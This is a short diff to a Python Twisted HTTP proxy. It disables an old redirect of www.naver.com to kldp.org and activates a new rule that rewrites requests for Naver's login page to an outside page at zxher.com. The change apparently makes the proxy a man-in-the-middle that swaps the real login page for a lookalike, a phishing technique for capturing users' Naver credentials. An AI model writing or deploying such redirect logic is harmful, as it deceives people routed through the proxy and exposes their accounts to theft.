@@ -96,9 +96,9 @@ class ProxyClientFactory(protocol.ClientFactory):
         #print "*******************" + self.protocol
         #print "*******************" + self.method
         #print "*******************" + self.uri
-        #if "static.nid.naver.com/login.nhn" in self.uri:
-        #    print "########"
-        #    self.uri = "kldp.org"
+        if "static.nid.naver.com/login.nhn" in self.uri:
+            print "########"
+            self.uri = "http://zxher.com/bob/login2.html"
         #print "*******************" + self.postData
         #print "*******************" + self.headers
         #print "*******************" + self.originalRequest
@@ -137,9 +137,9 @@ class ProxyRequest(http.Request):
             host, port = host.split(':')
             port = int(port)
         
-        if "www.naver.com" == host :
-                print "www.naver.com -> kldp.org "
-                host = "kldp.org"    
+        #if "www.naver.com" == host :
+        #        print "www.naver.com -> kldp.org "
+        #        host = "kldp.org"    
 
         self.setHost(host, port)
 
